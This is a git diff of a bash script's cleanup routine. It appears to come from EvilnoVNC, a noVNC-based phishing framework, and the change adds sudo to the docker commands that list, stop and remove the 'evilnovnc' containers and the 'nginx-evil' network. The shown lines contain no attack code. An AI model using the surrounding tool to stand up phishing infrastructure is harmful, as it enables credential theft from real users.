@@ -5,15 +5,15 @@ trap cleanup EXIT
 
 cleanup() {
     printf "\n\e[1;33mListing active containers...\e[1;0m\n"
-    docker ps -a --filter ancestor=evilnovnc
+    sudo docker ps -a --filter ancestor=evilnovnc
 
     printf "\n\e[1;33mAsking the user if they want to stop and remove all containers...\e[1;0m\n"
     printf "\n\e[1;33mDo you want to stop and remove all containers? (y/n):\e[1;0m "
     read -r response
     if [[ "$response" == "y" ]]; then
         printf "\n\e[1;33mStopping and removing containers...\e[1;0m\n"
-        docker stop $(docker ps -a -q --filter ancestor=evilnovnc)
-        docker rm $(docker ps -a -q --filter ancestor=evilnovnc)
+        sudo docker stop $(sudo docker ps -a -q --filter ancestor=evilnovnc)
+        sudo docker rm $(sudo docker ps -a -q --filter ancestor=evilnovnc)
     fi
 
     printf "\n\e[1;33m[>] Wait a moment..." ; sleep 3
@@ -21,6 +21,7 @@ cleanup() {
     sudo docker network rm nginx-evil > /dev/null 2>&1 &
     printf "\n\e[1;32m[+] Done!\n\e[1;0m"
 }
+
 function banner {
     printf "\e[1;34m                                                     
      _____       _ _          __     ___   _  ____ 
